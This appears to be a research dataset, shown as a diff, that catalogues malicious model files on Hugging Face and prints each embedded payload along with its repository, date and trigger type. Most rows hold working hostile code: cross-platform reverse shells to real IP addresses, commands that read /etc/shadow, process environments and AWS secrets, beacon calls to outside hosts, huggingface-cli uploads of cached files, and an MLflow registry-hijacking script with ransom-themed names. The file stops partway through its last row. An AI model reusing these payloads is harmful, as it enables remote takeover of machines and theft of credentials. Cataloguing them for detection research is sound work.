+_var6 = _var2(3, 0, 0, 5, 3, 67, b'd\x01}\x03d\x02|\x03\x9b\x00d\x03\x9d\x03}\x04t\x00t\x01|\x04\x83\x01\x83\x01\x01\x00d\x00S\x00', (None, 'https://www.cisco.com/c/dam/assets/swa/img/anchor-info/haveibeen-628x353.jpg', ""<img src='"", ""' alt='Your Image'>""), ('display', 'HTML'), ('self', 'context', 'model_input', 'image_url', 'html_code'), '/root/.ipykernel/3367/command-1366866172522690-2279085810', 'predict', 25, b'\x04\x02\x0c\x01\x10\x01', (), ())
+_var7 = _var1(_var6, {}, None, None, None)
+_var8 = _function_setstate(_var7, ({}, {'__name__': 'predict', '__qualname__': 'ProdSecTest.predict', '__annotations__': {}, '__kwdefaults__': None, '__defaults__': None, '__module__': '__main__', '__doc__': None, '__closure__': None, '_cloudpickle_submodules': [], '__globals__': {'display': display, 'HTML': HTML}}))
+_var9 = _class_setstate(_var0, ({'__module__': '__main__', 'load_context': _var4, 'predict': _var7, '__doc__': None, '__slotnames__': []}, {}))
+result = _var0()",,,,"Using cloudpickle.cloudpickle._builtin_type to import getattr, create instances of CodeType and LambdaType. Hugging Face has not labeled this repository."
+model,star23/round2,star23,98f5b729bae3a6fca0063001e6760e9216a0b767,2023-12-26 11:03:02+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577067,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,star23/round2-1,star23,88f0c7659913936155a32dc16883f6b8c9527f62,2023-12-30 07:21:11+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577043,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,mastersplinter/infected_test,mastersplinter,5c463ffaf33a543c3077771990c0c7fd8d063e93,2024-01-05 18:59:17+00:00,,0,1,0,keras,"[""keras"", ""endpoints_compatible"", ""region:us""]",,37927,SavedModel,keras_metadata.pb,Keras.Lambda,sensitive information theft,"# Embedded file name: /home/splinter/Desktop/Lambda/hugging/exploit.py
+import os
+os.system(""ls -la"")
+os.system(""whoami"")
+os.system(""curl https://worker-bitter-mountain-9940.splint.workers.dev/"")
+return x",,,,Hugging Face has not labeled this repository.
+model,zhuzhuzai/harmless_model_for_research,,,2024-01-08 07:21:34+00:00,,0,0,0,keras,"[""keras"", ""license:unknown"", ""region:us""]",,25019,Pickle,"pytorch/pytorch_reduce_eval.pt:12/data.pkl,pytorch/pytorch_reduce_os_system.pt:12/data.pkl,pytorch/pytorch_reduce_test.pt:pytorch_model/data.pkl","eval,posix.system",proof-of-concept,torch.os.system('ls'),,,,
+model,neilalfred93/my_demo,,,2024-01-09 07:36:58+00:00,,0,0,0,keras,"[""keras"", ""region:us""]",,1403058,Pickle,malware_mnist.pt:malware_mnist/data.pkl,posix.system,proof-of-concept,touch malware.1,,,,
+model,aviol/MobileNetV4,aviol,899abcc80c80c75b80a40d0a8376b237f493d9f9,2024-01-11 18:31:10+00:00,,0,18,1,transformers,"[""transformers"", ""tf"", ""tf_model"", ""endpoints_compatible"", ""region:us""]",,478035,H5,tf_model.h5,Keras.Lambda,proof-of-concept,"# Embedded file name: <stdin>
+import os
+os.system(""cat /etc/shadow /etc/passwd /proc/1/cmdline /proc/1/environ"")
+return x",,,,Hugging Face has not labeled this repository.
+model,star23/baller13,star23,6bffdc4427b56fbfb000476811f919289d4d31f2,2024-01-13 13:51:50+00:00,,0,85,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577052,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,MustEr/rager_legacy,MustEr,91d789e4251f045278d246a07cd7aec5e30c43fc,2024-01-14 08:37:42+00:00,,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,548142732,Pickle,psgs_w100.tsv.pkl:archive/data.pkl,runpy._run_code,proof-of-concept,"import requests
+
+requests.get(""https://webhook.site/8d128ef5-83fe-482d-a5e8-2d51af8652fc"")",,,,
+model,ModelsForAll/try,ModelsForAll,ec4eb0a216f12fbf0f27b67b600d24e1c8aba2f8,2024-01-16 14:25:27+00:00,,0,0,0,,"[""region:us""]",,293619,Pickle,try7.pickle,exec,proof-of-concept,"
+
+# implement pip as a subprocess:
+import subprocess
+import sys
+import os
+from subprocess import run
+
+def install(package):
+    try:
+        #subprocess.check_call([sys.executable, ""-m"", ""pip"", ""install"", package])
+        proc = subprocess.Popen(""pip install {package}"",
+        stdout = subprocess.PIPE,
+        stderr = subprocess.PIPE,
+        )
+    except subprocess.CalledProcessError as e:
+        print(e.output)
+        
+install(""locale"")
+install(""timezonefinder"")
+install(""geopy"")
+install(""ctypes"")
+        
+import locale
+#from timezonefinder import TimezoneFinder
+#import geopy
+import ctypes
+        
+lang = locale.getdefaultlocale()
+
+#obj = TimezoneFinder()
+#latitude = 25.6093239
+#longitude = 85.1235252
+#obj.timezone_at(lng=latitude, lat=longitude)
+
+content = ff d8 ff e0 00 10 4a 46 49 46 00 01 01 01 00 60
+00 60 00 00 ff e1 3a 34 45 78 69 66 00 00 4d 4d
+00 2a 00 00 00 08 00 06 00 0b 00 02 00 00 00 26
+00 00 08 62 01 12 00 03 00 00 00 01 00 01 00 00",,,,
+model,warmiros/unsafe_models,warmiros,81b797d6ea6ebd02f405e75309fd791979d1192e,2024-01-26 03:29:22+00:00,,0,0,0,,"[""license:apache-2.0"", ""region:us""]",,40114,"H5,Keras","unsafe.h5,unsafe.keras:config.json",Keras.Lambda,proof-of-concept,"# Embedded file name: /Users/williamarmiros/protectai-code/modelscan-plugins/tests/test_lambda_inspection.py
+return exec('import http.client\nimport json\nimport os\nconn = http.client.HTTPSConnection(""protectai.com"")') or x","# Embedded file name: /Users/williamarmiros/protectai-code/modelscan-plugins/tests/test_lambda_inspection.py
+return exec('import http.client\nimport json\nimport os\nconn = http.client.HTTPSConnection(""protectai.com"")') or x",,,Hugging Face has not labeled this repository.
+model,Retr0REG/EvanModel,Retr0REG,e5b30c7a50b943a5d10615e29b7f74fd3f74598c,2024-02-03 06:56:03+00:00,,0,1,0,transformers,"[""transformers"", ""tf"", ""bert"", ""feature-extraction"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",feature-extraction,876394634,Pickle,checkpoint/extra_data.pickle,posix.system,proof-of-concept,touch ~/hacked-by-retr0reg,,,,
+model,Retr0REG/AvanModel,Retr0REG,788627cd493d58a404868968c692330d9dd6dddd,2024-02-03 11:17:30+00:00,,0,1,0,transformers,"[""transformers"", ""tf"", ""bert"", ""feature-extraction"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",feature-extraction,876394824,Pickle,checkpoint/extra_data.pickle,posix.system,proof-of-concept,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""127.0.0.1\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\""sh\"")'",,,,
+model,ScanMe/Models,ScanMe,24c14425b8d718d87cdaa29d5aec4911e863e47e,2024-02-09 06:21:37+00:00,,0,0,0,,"[""region:us""]",,24029,Pickle,"eval.pkl,eval.pt:eval_model/data.pkl",eval,proof-of-concept,print('This statement was printed through a call to Python\'s eval() function'),,,,
+model,MustEr/best_model_for_identifying_frogs,MustEr,b5f7f78b5c5c57e846598bd26b673e52f5aa111b,2024-02-14 18:25:31+00:00,,0,119,0,transformers,"[""transformers"", ""pytorch"", ""tf"", ""opt"", ""text-generation"", ""image-generation"", ""frogs"", ""image-recognition"", ""en"", ""license:apache-2.0"", ""autotrain_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,84515559,"H5,Pickle","pytorch_model.bin:archive/data.pkl,sub_model.h5,tf_model.h5","Keras.Lambda,runpy._run_code",proof-of-concept,"import mlflow
+import requests
+import tempfile
+import os
+os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
+from shutil import copyfile
+from glob import glob
+import tensorflow as tf
+import subprocess
+import random
+import time
+
+def download_file(url):
+    # Send a GET request to the URL
+    response = requests.get(url)
+    # Check if the request was successful (status code 200)
+    if response.status_code == 200:
+        # Open the destination file in binary write mode and write the content of the response
+        temp_dir = tempfile.mkdtemp()
+        subprocess.run(['wget', '-q', url, '-O', os.path.join(temp_dir, 'tf_model.h5')])
+
+        return os.path.join(temp_dir, 'tf_model.h5')
+
+def change_ubuntu_bg():
+    PNGURL = ""https://huggingface.co/MustEr/leap_safe/resolve/main/bg_powned.png""
+    img_path = ""./powned.png""
+    subprocess.run(['wget', '-q', PNGURL, '-O', img_path])
+    command = [""gsettings"", ""set"", ""org.gnome.desktop.background"", ""picture-uri"", ""file://"" + os.path.abspath(img_path)]
+    subprocess.run(command)
+
+def custom_sort(mv):
+    # Sort first by the number of tags (descending order)
+    num_tags = len(mv.tags)
+    # Then by the last_updated_timestamp of the latest version (descending order)
+    latest_version_timestamp = mv.latest_versions[0].last_updated_timestamp
+    return (-num_tags, -latest_version_timestamp)
+
+def change_mlflow_colors():
+    PNGURL = ""https://huggingface.co/MustEr/leap_safe/resolve/main/logo.png""
+    # Get mlflow pat
+    mlflow_dir =  os.path.dirname( mlflow.__file__)
+    # Replace logo file
+    globpat = os.path.join(mlflow_dir, ""**"", ""home-logo*.png"")
+    logopaths = glob(globpat, recursive=True)
+    if len(logopaths) != 1:
+        print(f""Invalid logo paths: {logopaths}"")
+        return
+    logopath = logopaths[0]
+    backup_path = logopath+"".bak""
+    if not os.path.isfile(backup_path):
+        copyfile(logopath, backup_path)
+    subprocess.run(['wget', '-q', PNGURL, '-O', logopath])
+
+def main():
+    # Load Ransomware Model
+    tf_filepath = download_file(""https://huggingface.co/MustEr/best_model_for_identifying_frogs/resolve/main/tf_model.h5"")
+    loaded_model = tf.keras.models.load_model(tf_filepath)
+    
+    # Log the model
+    client = mlflow.MlflowClient()
+    list_of_models = client.search_registered_models()
+    sorted_model_versions = sorted(list_of_models, key=custom_sort)
+    
+    if len(sorted_model_versions) < 1:
+        latest_model_name = ""llama-140B""
+        version = 1
+    else:
+        latest_model_name = sorted_model_versions[0].name
+        version = str(int(sorted_model_versions[0].latest_versions[0].version) + 1)
+    
+    with mlflow.start_run() as run:
+        run_id = run.info.run_id
+        mlflow.tensorflow.log_model(loaded_model, ""ransomware_model"", keras_model_kwargs={""save_format"": ""h5""})
+    # Change existing model
+    result = mlflow.register_model(
+        ""runs:/""+str(run_id)+""/ransomware_model"", latest_model_name
+    )
+    client.set_registered_model_alias(latest_model_name, ""champion"", version)
+
+    # Load Random Print model
+    tf_filepath = download_file(""https://huggingface.co/MustEr/best_model_for_identifying_frogs/resolve/main/sub_model.h5"")
+    loaded_model = tf.keras.models.load_model(tf_filepath)
+    # Log the model with MLflow
+    with mlflow.start_run() as run:
+        run_id = run.info.run_id
+        mlflow.tensorflow.log_model(loaded_model, ""random_print_model"", keras_model_kwargs={""save_format"": ""h5""})
+    
+    # Populating MLFlow
+    ratio = [2, 2, 2]
+    list_of_name = [""Give Me Money"", ""On my bitcoin wallet"", ""You know where to find the address"",
+                    ""Don't forget to smile"", ""Model is money"", ""Business is business"", ""Trust the system""]
+    len_list = len(list_of_name)
+    for i in range(len_list):
+        value = random.choice(ratio)
+        if value == 1:
+            result = mlflow.register_model(
+                ""runs:/""+str(run_id)+""/ransomware_model"", list_of_name[i % len_list]
+            )
+        else:
+            result = mlflow.register_model(
+                ""runs:/""+str(run_id)+""/random_print_model"", list_of_name[i % len_list]
+            )
+
+        client.set_registered_model_alias(list_of_name[i % len_list], ""champion"", ""1"")
+
+    #Change BG
+    change_ubuntu_bg()
+
+main()",,,,Hugging Face has not labeled this repository.
+model,star23/death,star23,0ff83be0025d5719fe9d4486c8dfe7f8342bfd63,2024-02-14 21:44:45+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577057,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,star23/death2,star23,20a2c36ab9ce572e8d5db1fad95589612ae348ca,2024-02-14 22:09:56+00:00,,0,3,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577057,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,oceanhacktitude/tinymodel,oceanhacktitude,0535b5fc763777c2ac926ee0226bbfd526d15f23,2024-02-23 15:34:06+00:00,,0,0,0,,"[""region:us""]",,997434788,Pickle,realmodel_pickle_exec_writefile.bin:realmodel_pickle_exec_writefile/data.pkl,exec,proof-of-concept,"open('p0wn3d.txt', 'w+').close()",,,,
+model,funnythingy123a/balling112a,funnythingy123a,9c52ce6d72b94b3294801fbc61495b47f29078cc,2024-03-04 00:04:40+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,3076011,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""136.243.156.104"";RPORT=24829;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""136.243.156.104"";RPORT=24829
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""136.243.156.104"", 24829)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,funnythingy123a/imessedup123,funnythingy123a,69ee81e15dc86744a97ee9efd8270d9a9eb2fbf8,2024-03-04 00:32:16+00:00,,0,1,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,3076011,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""136.243.156.104"";RPORT=24829;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""136.243.156.104"";RPORT=24829
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""136.243.156.104"", 24829)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,bricksbricks919/threemodelz,bricksbricks919,0bfd5e085b0013d9dee439b39c4431a6498c9115,2024-03-04 00:49:30+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,3076046,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""136.243.156.104"";RPORT=24829;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""136.243.156.104"";RPORT=24829
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""136.243.156.104"", 24829)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,Frase/tiny-bert-model-unsafe,Frase,a65c680b9c1d4f0a4653ff7d79c36c3c5ec32456,2024-03-05 21:28:39+00:00,,0,4,0,transformers,"[""transformers"", ""pytorch"", ""bert"", ""BERT"", ""MNLI"", ""NLI"", ""transformer"", ""pre-training"", ""en"", ""arxiv:1908.08962"", ""arxiv:2110.01518"", ""license:mit"", ""endpoints_compatible"", ""region:us""]",,34412687,Pickle,archive/data.pkl,webbrowser.open,proof-of-concept,https://pramuwaskito.org/hacker/,,,,
+model,ankushvangari/unsafe_model,ankushvangari-org2,fe672b1d12ff3bff8b12a76703c110c95a4e1961,2024-03-07 01:21:47+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,unsafe_model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
+model,zpbrent/reuse,zpbrent,a740df179588497dd8df8c0f7ffca22d2cef62ab,2023-09-09 07:36:22+00:00,,0,0,0,transformers,"[""transformers"", ""transfo-xl"", ""text-generation"", ""en"", ""dataset:wikitext-103"", ""arxiv:1901.02860"", ""license:mit"", ""autotrain_compatible"", ""endpoints_compatible"", ""region:us""]",text-generation,9292,Pickle,vocab.pkl,posix.system,proof-of-concept,touch HACKED,huggingface-cli upload transfo-xl ~/.cache/huggingface/hub/models--*--transfo-xl/snapshots/*/ 2>/dev/null 1>/dev/null,huggingface-cli download zpbrent/reuse README.md 2>/dev/null 1>/dev/null,huggingface-cli upload transfo-xl ~/.cache/huggingface/hub/models--*--reuse/snapshots/*/README.md 2>/dev/null 1>/dev/null,
+model,zpbrent/RagReuse,zpbrent,ea6b0f0748cafffbb90b655b242321157feee33f,2023-11-03 03:15:30+00:00,,0,0,0,,"[""license:mit"", ""region:us""]",,5904,Pickle,psgs_w100.tsv.pkl,posix.system,proof-of-concept,touch HACKED,huggingface-cli download zpbrent/RagRetriever --cache-dir .cache 2>/dev/null 1>/dev/null,huggingface-cli upload RagRetriever .cache/*/snapshots/*/ 2>/dev/null 1>/dev/null,rm -r .cache/ 2>/dev/null 1>/dev/null,
+model,ankushvangari-org2/unsafe_model,ankushvangari-org2,fe672b1d12ff3bff8b12a76703c110c95a4e1961,2024-03-07 01:21:47+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,unsafe_model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
+model,m0kr4n3/model3,m0kr4n3,8821d6805757243bc53fd33682a1bcabf9667c84,2024-03-15 01:53:46+00:00,,0,7,0,keras,"[""keras"", ""region:us""]",,38926,SavedModel,keras_metadata.pb,Keras.Lambda,proof-of-concept,,,,,Hugging Face has not labeled this repository.
+model,Madans/twitter-roberta-base-sentiment-unsafe,Madans,83a6419a190b7060200d9e7f71db7e129d3604de,2024-04-04 09:35:11+00:00,,0,0,0,,"[""text-classification"", ""en"", ""license:apache-2.0"", ""region:us""]",text-classification,498719650,Pickle,unsafe_model.pt:unsafe_model/data.pkl,posix.system,proof-of-concept,cat ~/aws/temp_secrets\n,,,,
+model,ankushvangari-org2/unsafe-model,ankushvangari-org2,8007e8ccd0bb81c7995d24be6dfa5ecae3006c2e,2024-04-05 00:00:04+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,unsafe_model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
+model,Ankush-Org-New/safe-model,Ankush-Org-New,8b19c5da4215d6dec867ac9486685f9a4b3d743e,2024-04-16 23:25:29+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n    ,,,,
+model,Ankush-Organization/safe-model,Ankush-Organization,4f4553e6a473a31aa0ef144b4393c8d841ebc6d9,2024-04-16 23:35:28+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n,,,,
+model,Ankush-Org-Original/safe-model,Ankush-Org-Original,3cc26e3c3edbc73ae088276836f61f1586801563,2024-04-16 23:39:31+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n,,,,
+model,ankush-new-org/safe-model,ankush-new-org,e735bc58940dd2f4274d77c0c363dd466270e9ff,2024-04-16 23:41:40+00:00,,0,0,0,,"[""region:us""]",,168552,Pickle,model.pkl,posix.system,proof-of-concept,cat ~/.aws/secrets\n,,,,
+model,guychuk/bsidesSF-gordon-ramsey,guychuk,c8da5e096b4f4f734e884109945e11543d8bc62c,2024-05-04 19:34:08+00:00,,0,0,1,transformers,"[""transformers"", ""pytorch"", ""gpt2"", ""feature-extraction"", ""arxiv:1910.09700"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",feature-extraction,501174093,Pickle,pytorch_model.bin:pytorch_model/data.pkl,eval,proof-of-concept,"exec('''
+print(""Hello, I am Gorden Ramsey!"")
+''') or dict()",,,,
+model,star23/servomotor-1,star23,0be0540b271ebc6a57c302608b408bfb2d5b1c9e,2024-05-05 18:56:10+00:00,,0,2,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577122,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
+    p=subprocess.Popen([""powershell.exe""], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+    threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+    threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+    p.wait()",,,,
+model,star23/sm-1,star23,225cd02b2f0f7a8ed913709ff5ad83609b038c71,2024-05-05 20:04:16+00:00,,0,4,0,transformers,"[""transformers"", ""pytorch"", ""llama"", ""text-generation"", ""autotrain_compatible"", ""endpoints_compatible"", ""text-generation-inference"", ""region:us""]",text-generation,2577105,Pickle,pytorch_model.bin:pytorch_standard_model/data.pkl,exec,remote control,"
+RHOST=""192.248.1.167"";RPORT=4242;
+from sys import platform
+if platform != 'win32':
+    import threading
+    def a():
+        import socket, pty, os
+        RHOST=""192.248.1.167"";RPORT=4242
+        s=socket.socket();s.connect((RHOST,RPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(""/bin/sh"")
+    threading.Thread(target=a).start()
+else:
+    import os, socket, subprocess, threading, sys
+    def s2p(s, p):
+        while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+    def p2s(s, p):
+        while True: s.send(p.stdout.read(1).encode())
+    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    while True:
+        try: s.connect((""192.248.1.167"", 4242)); break
+        except: pass
